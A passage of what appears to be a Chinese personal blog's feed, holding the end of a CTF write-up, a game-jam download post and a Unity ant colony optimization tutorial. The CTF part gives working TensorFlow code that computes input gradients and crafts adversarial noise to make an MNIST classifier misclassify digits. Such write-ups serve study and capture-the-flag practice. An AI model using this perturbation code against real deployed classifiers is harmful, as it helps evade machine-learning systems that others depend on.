class="number">25872</span>, <span class="number">42855</span>, <span class="number">49719</span>, <span class="number">31176</span>, <span class="number">38292</span>, <span class="number">48100</span>, <span class="number">52763</span>, <span class="number">3904</span>, <span class="number">46879</span>, <span class="number">9810</span>, <span class="number">51583</span>, <span class="number">39760</span>, <span class="number">21245</span>, <span class="number">13728</span>, <span class="number">33834</span>, <span class="number">23968</span>, <span class="number">28781</span>, <span class="number">33134</span>, <span class="number">35277</span>, <span class="number">18562</span>, <span class="number">21344</span>, <span class="number">8396</span>, <span class="number">36000</span>, <span class="number">43427</span>, <span class="number">24477</span>, <span class="number">36678</span>, <span class="number">56218</span>, <span class="number">32945</span>, <span class="number">17707</span>, <span class="number">36763</span>, <span class="number">611</span>, <span class="number">12668</span>, <span class="number">31312</span>, <span class="number">28053</span>, <span class="number">35696</span>, <span class="number">9876</span>, <span class="number">33329</span>, <span class="number">56107</span>, <span class="number">19929</span>, <span class="number">35636</span>, <span class="number">21704</span>, <span class="number">35807</span>, <span class="number">28645</span>, <span class="number">16522</span>, <span class="number">15192</span>, <span class="number">43890</span>, <span class="number">14710</span>, <span class="number">11805</span>, <span class="number">4754</span>, <span class="number">33660</span>, <span class="number">13270</span>, <span class="number">25465</span>, <span class="number">20267</span>, <span class="number">4141</span>, <span class="number">40391</span>, <span class="number">14287</span>, <span class="number">15545</span>, <span class="number">56458</span>, <span class="number">6121</span>, <span class="number">19663</span>, <span class="number">15709</span>, <span class="number">52825</span>, <span class="number">25933</span>, <span class="number">4091</span>, <span class="number">17861</span>, <span class="number">37773</span>, <span class="number">22450</span>, <span class="number">8669</span>, <span class="number">4447</span>, <span class="number">22022</span>, <span class="number">40046</span>, <span class="number">32738</span>]</span><br><span class="line"></span><br><span class="line">dict_mnist = np.load(<span class="string">&quot;mnist.npz&quot;</span>)</span><br><span class="line">x_train = dict_mnist[<span class="string">&quot;x_train&quot;</span>]</span><br><span class="line">y_train = dict_mnist[<span class="string">&quot;y_train&quot;</span>]</span><br><span class="line">x_test = dict_mnist[<span class="string">&quot;x_test&quot;</span>]</span><br><span class="line">y_test = dict_mnist[<span class="string">&quot;y_test&quot;</span>]</span><br><span class="line">dict_mnist.close()</span><br><span class="line">x_train = np.expand_dims(x_train, axis=<span class="number">3</span>)</span><br><span class="line">x_test = np.expand_dims(x_test, axis=<span class="number">3</span>)</span><br><span class="line"><span class="comment">#normalize</span></span><br><span class="line">x_train = (x_train-np.amin(x_train))/(np.amax(x_train)-np.amin(x_train))</span><br><span class="line">x_test = (x_test-np.amin(x_test))/(np.amax(x_test)-np.amin(x_test))</span><br><span class="line"></span><br><span class="line">test_x_data = []</span><br><span class="line">test_y_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test_set:</span><br><span class="line">    test_x_data.append(x_train[i])</span><br><span class="line">    test_y_data.append(y_train[i])</span><br><span class="line">test_x_data = np.array(test_x_data)</span><br><span class="line">test_y_data = np.array(test_y_data)</span><br><span class="line">test_x_data = test_x_data.astype(np.float32)</span><br><span class="line">test_y_data = test_y_data.astype(np.float32)</span><br></pre></td></tr></table></figure><h3 id="获取梯度"><a href="#获取梯度" class="headerlink" title="获取梯度"></a>获取梯度</h3><p>tensorFlow提供了很好用的求梯度的接口gradientTape</p><blockquote><p>2022/01/16补充：这个函数在之前写wp的时候对我来说就是一个黑盒，对模型求输入的梯度的具体原理请看开头提到的新文章</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetGrad</span>(<span class="params">data, classIndex=-<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="comment"># 当 classIndex=-1，求样本到最近的最高概率点</span></span><br><span class="line">    <span class="comment"># 当指定 classIndex，求样本到指定的classIndex的最高概率点</span></span><br><span class="line">    data = data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    data = tf.cast(data, tf.float32)</span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        tape.watch(data)</span><br><span class="line">        pred = model(data)</span><br><span class="line">        <span class="comment"># loss = tf.norm(pred, axis=1, ord=2) if classIndex == -1 else pred[0][classIndex]  # 有的文章把loss这么写</span></span><br><span class="line">        loss = pred[<span class="number">0</span>][np.argmax(pred)] <span class="keyword">if</span> classIndex == -<span class="number">1</span> <span class="keyword">else</span> pred[<span class="number">0</span>][classIndex]</span><br><span class="line">    grad = tape.gradient(loss, data)</span><br><span class="line">    <span class="keyword">return</span> np.array(grad).reshape(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="梯度下降求noise"><a href="#梯度下降求noise" class="headerlink" title="梯度下降求noise"></a>梯度下降求noise</h3><p>这样求出来的noise通常能以最小的Lp将样本送出去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GradDes</span>(<span class="params">data, foolRate=<span class="number">0.5</span>, step=<span class="number">0.05</span>, maxIteration=<span class="number">500</span></span>):</span></span><br><span class="line">    minGrad = <span class="number">0.05</span></span><br><span class="line">    arg = np.argmax(model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    print(<span class="string">&quot;GetPert init arg : &quot;</span> + <span class="built_in">str</span>(arg))</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    pert = copy.deepcopy(data / np.inf)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        rate = model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>) + pert.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))[<span class="number">0</span>][arg]</span><br><span class="line">        print(<span class="string">&quot;\r - Iteration : &quot;</span> + <span class="built_in">str</span>(cnt) + <span class="string">&quot; rate : &quot;</span> + <span class="built_in">str</span>(rate), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> rate &lt; foolRate <span class="keyword">or</span> cnt == maxIteration:</span><br><span class="line">            result = model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>) + pert.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">&quot;\n - pert result : &quot;</span> + <span class="built_in">str</span>(np.argmax(result)) + <span class="string">&quot; : &quot;</span> + <span class="built_in">str</span>(np.amax(result)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        grad = GetGrad(data + pert)</span><br><span class="line">        <span class="keyword">if</span> norm(grad) &lt; minGrad:</span><br><span class="line">            <span class="keyword">if</span> norm(grad) == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&quot;ERROR: grad is zero&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            grad *= minGrad / norm(grad)</span><br><span class="line">        pert -= grad * step</span><br><span class="line">    <span class="keyword">return</span> pert</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>这样求算数平均值得方法其实有点问题，如果恰好有一个反向的pert，那不直接抵消哩，而且我用到的样本里面还有一个是一开始本来就被分类器误分类的点= =…但是既然他得出的结果能用那就先在这里这么写，然后再讨论更好的解法嗯</p><p>用了算数平均值来求noise，没有鲁棒性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pert = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    pert[i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">9</span>)[i][<span class="number">0</span>]])</span><br><span class="line">    pert[i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">7</span>)[i][<span class="number">0</span>]] + pert[i])</span><br><span class="line">    pert[<span class="number">2</span> * i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">7</span>)[<span class="number">2</span> * i][<span class="number">0</span>]])</span><br><span class="line">    pert[<span class="number">2</span> * i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">9</span>)[<span class="number">2</span> * i][<span class="number">0</span>]] + pert[<span class="number">2</span> * i])</span><br><span class="line">pertSum = pert[<span class="number">0</span>]/np.inf</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pert:</span><br><span class="line">    pertSum += i</span><br><span class="line">pert = pertSum/<span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="exp优化"><a href="#exp优化" class="headerlink" title="exp优化"></a>exp优化</h2><p>目前的想法是：最好是通过求：将样本带到不同的边界的noise（比如本题中就是求出将样本7和9带到0,1,2,3,4,5,6,8的noise），然后比较这些noise在方向与范数上的差异，获得最优的noise，此时求算数平均值就没有问题了</p><p>但是在具体实现上遇到的问题就是：在梯度上升求noise的时候会陷入局部最优解（尤其是相差较大的class），然后目前虽然知道什么退🔥遗传🐜群啥的，但还没有想过具体到底怎么弄</p><p>但：对每一个class都求一个noise，使得某一特定样本偏移到其他的任意class是可行的</p><blockquote><p>2022.4.6补充：根据最近了解的信息看来，陷入局部最优解大部分原因是因为卡在鞍点，换成更好的优化算法，如Adam等即可</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uncertainty download available!</title>
      <link href="2021/11/17/Uncertainty/"/>
      <url>2021/11/17/Uncertainty/</url>
      
        <content type="html"><![CDATA[<p>Welcome to BadAperture.Inc！</p><p><img src="/images/Uncertainty_cover.png"></p><span id="more"></span><h1 id="Uncertainty"><a href="#Uncertainty" class="headerlink" title="Uncertainty"></a>Uncertainty</h1><p>Uncertainty是一款由BadAperture团队在2021NovaGameJam期间制作的活动作品，其中主要包含了解谜、跑酷两种类型的关卡，更多有关信息请您查看游戏主菜单中的ABOUT选卡！</p><blockquote><p>提取链接：<a href="https://pan.baidu.com/s/1DVbqyM2yhpzKt932_LWzEw">https://pan.baidu.com/s/1DVbqyM2yhpzKt932_LWzEw</a><br>提取码：BDAP</p></blockquote><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本作品中仍然存在诸多不足，还请玩家多多包容，另外，由于时间不足，本作不包含任何音频，文字部分还请您耐心阅读，其中也许包含了线索及提示，我们对所有未处理得当的地方深表歉意</p><p>这是我们第一次尝试游戏制作（之前是一块整音乐的😂），之所以会在jam中选择制作一个小体量的3D游戏，主要还是因为相对于正常的gameJam，他们给的时间实在是太多了（貌似是三个周，然后在线下展示了之后又继续完善了一个周），于是我们就做出了这么一个大胆的尝试</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ant Colony Optimization</title>
      <link href="2021/10/02/Ant_Colony_Optimization/"/>
      <url>2021/10/02/Ant_Colony_Optimization/</url>
      
        <content type="html"><![CDATA[<p>蚁群优化算法，最直观的一个示例用途是解决TPS（TravelingSealsmanProblem）问题，快速寻找一个可观的解，但需要你调的一手好参</p><p><img src="/images/ACO_cover.gif"></p><span id="more"></span><h1 id="Ant-Colony-Optimization"><a href="#Ant-Colony-Optimization" class="headerlink" title="Ant Colony Optimization"></a>Ant Colony Optimization</h1><blockquote><p> 蚁群，退火，遗传，三大知名优化算法</p></blockquote><p>蚁群优化算法，启发在于蚂蚁觅食的行为，即一段时间后蚂蚁能够找到最短的路径到达食物的位置；核心在于对信息素的抽象，蚁群算法之所以能够快速优化，得益于算法已有的成果积累；一句话说明白这个算法，那就是在当前解的基础上去寻找更优解</p><p>本文记录一下写这个算法的unity可视化实现过程，但是我还是建议您自己写一遍👼，体验一下令人非常不愉快的调参体验💢；如果你决定自己写一遍，可以在看了<strong>Getting Start</strong>理解算法原理后直接开干，卡住了再来参考一下后面的具体实现方法</p><p>之后应该会先去学一些shader相关的内容，以免在很多之后想做的工程中受限</p><h2 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h2><h3 id="TPS"><a href="#TPS" class="headerlink" title="TPS"></a>TPS</h3><p>旅行商人问题，一句话概括就是</p><blockquote><p> 找到一条长度最短的线串联起一些固定的点</p></blockquote><p>假设有n个点，那么将有<code>(n-1)!/2</code>种可能性，如果遍历所有结果，n稍微一大即刻计算不可行，蚁群优化算法的作用就是在短时间内找到一个可观的解，虽然这个解不一定会是最优解，但相对于算法消耗的算力与时间来说性价比高</p><h3 id="Process-Outline"><a href="#Process-Outline" class="headerlink" title="Process Outline"></a>Process Outline</h3><p>在用蚁群算法解决TPS问题时，有两个可以提高效率与结果质量的关键，这两个点不易被注意，所以放在开头就说</p><ul><li>一、将蚂蚁按组统计：不要在一只蚂蚁结束搜索后立即更新数据，而需要等待一定数量的蚂蚁均完成后再更新</li><li>二、随机选取每只蚂蚁的起点：多数时候，蚂蚁多绕的路程均来自于蚂蚁在走到最后一个点后返回起点的那一条线段，如果设定每只蚂蚁的起点不变，效率会更低，多次迭代后的结果也还是会产生交叉路线（which is obviously not the best solution）</li></ul><p>接下来是每轮（每组）蚂蚁跑的基本流程：</p><ul><li>随机选择起点</li><li>用距离与信息素对路径<strong>加权后随机</strong>选择路径</li><li>更新已选择过的点，使得蚂蚁不会返回已经到达过的点</li><li>当走到最后一个点，直接返回起点</li></ul><p>一组蚂蚁跑完后更新信息素矩阵</p><ul><li>对信息素矩阵乘以一个系数使得已有的信息素浓度降低<ul><li>根据当前组蚂蚁跑出来的路径距离长度，当前组中路径最短的蚂蚁留下的信息素最多，而路径长的蚂蚁信息素少</li></ul></li></ul><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><p>由于算法的计算过程比较零碎，就不拿出来说了，在最后会直接放源码，这里主要解释一些参数</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>点之间距离的表格是对称的</p><img src="/images/ACO_disGraph.png" style="zoom:50%;" /><p>为了只读写一个数据，只取表格的一半就够了，然后写一个函数，输入两个点的index，返回对应的表格中路径的index</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">GetPathIndex</span>(<span class="params"><span class="built_in">int</span> cur1, <span class="built_in">int</span> cur2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cur1 &gt; cur2)&#123;</span><br><span class="line">        <span class="built_in">int</span> tmp = cur1;</span><br><span class="line">        cur1 = cur2;</span><br><span class="line">        cur2 = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= cur1; i++) index += numPoint - i;</span><br><span class="line">    index += cur2 - cur1 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p>首先需要介绍一下算法涉及的几个重要参数</p><h4 id="Ant"><a href="#Ant" class="headerlink" title="Ant"></a>Ant</h4><p><code>numInGroup</code>规定了一个轮次中的蚂蚁数量，一轮中的蚂蚁越少迭代频率越高，蚂蚁越多则在更短路径上留下信息素的可能越大</p><blockquote><p>Recommended Value：5~25</p></blockquote><h4 id="Pheromone"><a href="#Pheromone" class="headerlink" title="Pheromone"></a>Pheromone</h4><p>信息素的必要参数有：<strong>最小值，初始值，增量，衰减值</strong>，但我为了防止浓度过高也弄了个最大值</p><ul><li><p><code>deltaPhe</code>规定了信息素在迭代时的增量</p><blockquote><p>Recommended Value：10</p></blockquote></li><li><p><code>pheMaxTimes</code>调整了信息素最大值，由于我的最大值还决定了初始值以及后面的一些对算法的tweak，所以我给出的推荐值会比较大，以制造出不同路径的差异性，从而更快地收敛到可观的解</p><blockquote><p>Recommended Value：25~50</p></blockquote></li><li><p><code>pheDrop</code>即每次寻路后衰减的百分比</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pheromone[i] *= pheDrop;</span><br><span class="line"><span class="keyword">if</span> (pheromone[i] &lt; pheMin) pheromone[i] = pheMin;</span><br></pre></td></tr></table></figure><blockquote><p>Recommended Value：0.7</p></blockquote></li><li><p>其他几个参数为了省事就通过自己估计的公式计算了嗯</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calculate pheromone parameters</span></span><br><span class="line">pheMax = deltaPhe * pheMaxTimes * numInGroup;</span><br><span class="line">pheInit = pheMax / <span class="number">5</span>;</span><br><span class="line">pheMin = pheInit * Mathf.Pow(pheDrop, <span class="number">5</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>emphasizeBest</code>因为在一轮迭代中可能存在没有蚂蚁按照当前最优解行进的情况，从而导致目前已发现的最优解路径上的信息素浓度降低，故需要在每轮迭代中都假设有一定数量的蚂蚁经过了最优路线，此参数就是用于规定这一具体数量</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pheromone[i] += deltaPhe * emphasizeBest;</span><br></pre></td></tr></table></figure><blockquote><p>Recommended Value：15</p></blockquote></li></ul><h4 id="Weight"><a href="#Weight" class="headerlink" title="Weight"></a>Weight</h4><p>蚁群优化算法的核心就在于调整每条路径的概率，而概率由下面的公式决定</p><img src="/images/ACO_formula.png" alt="ACO_formula" style="zoom: 50%;" /><p>其中，<code>τ</code>=信息素浓度，<code>η</code>=1/距离，<code>α</code>与<code>β</code>就是俩权重的参数</p><p><code>phePow</code>，即<code>α</code></p><blockquote><p>Recommended Value：3.5</p></blockquote><p><code>disPow</code>即<code>β</code></p><blockquote><p>Recommended Value：6</p></blockquote><h2 id="Improvement"><a href="#Improvement" class="headerlink" title="Improvement"></a>Improvement</h2><h3 id="Crossing"><a href="#Crossing" class="headerlink" title="Crossing"></a>Crossing</h3><p>最开始说过：交叉的路线明显不是最优解</p><p><img src="/images/ACO_crossing.png"></p><p>但通常在最开始的时候都会出现交叉路线，而且随着点的数目增加，交叉路线被消除的概率逐步减小。所以我每次在看到最优解的图中一直有一个交叉线半天不动时就会非常难受，所以我们需要考虑如何让蚂蚁自动规避交叉</p><ul><li>在寻路时规避交叉：降低选择到 会与已选择的路径交叉的 点的概率</li><li>在强调最优解时规避交叉：不强调交叉路线的最优解，甚至反手将交叉的路线的信息素浓度降低，并提升不交叉线路的信息素浓度来引导</li></ul><p>应用以上两条，可以使路径快速迭代至一个没有交叉的状态</p><h3 id="Small-Angle"><a href="#Small-Angle" class="headerlink" title="Small Angle"></a>Small Angle</h3><p>路线中出现极小的角度也是非常不理想的一件事</p><img src="/images/ACO_smallAngle.png" alt="ACO_smallAngle" style="zoom:67%;" /><p>说实话目前没有什么很好的解决方案，目前我做的也仅仅是不去强化这个路径之类的，但不能快速处理掉这种情形</p><h3 id="Annealing"><a href="#Annealing" class="headerlink" title="Annealing"></a>Annealing</h3><p>调参时会发现许多参数需要动态调整，如初期应增加信息素浓度的权重，而后期却需要信息素与距离的平衡下进行优化，否则就容易自闭收敛，停滞不前；再比如初期应使信息素衰减速率较大，以促进收敛，而后期却需要额外的信息素来减少自闭的概率</p><p>这些需求与另一优化算法：<strong>模拟退火算法</strong> 相呼应，在此我没有进行这已实现，但若将这两个算法相结合，则肯定能够使得效率与结果质量都得到提升</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        Main    </div>    <div class='spoiler-content'>        <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span 